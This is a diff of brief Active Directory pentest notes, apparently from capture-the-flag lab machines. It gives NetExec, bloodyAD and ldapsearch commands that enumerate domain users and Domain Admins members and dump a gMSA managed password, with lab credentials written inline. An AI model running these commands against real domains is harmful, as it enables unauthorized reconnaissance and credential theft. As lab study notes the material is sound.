@@ -2,6 +2,12 @@ ldap is always worth taking a look at on DCs, this script could be good to get u
 
 1. run this command with creds to get users and descriptions == nxc ldap CICADA-DC -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
 
+UTILIZE THE BLOODYAD TOOL
+
+Example usage. Retrieves group members.
+
+bloodyAD --host 192.168.10.2 -d bloody.local -u john.doe -p Password123! get children --target "Domain Admins"
+
 One method to dump the GMSA password is ldapsearch (apt install ldap-utils)
 
 1. ldapsearch -LLL -H ldap://dc01.vintage.htb -Y GSSAPI -b 'DC=vintage,DC=htb' '(&(ObjectClass=msDS-GroupManagedServiceAccount))' msDS-ManagedPassword
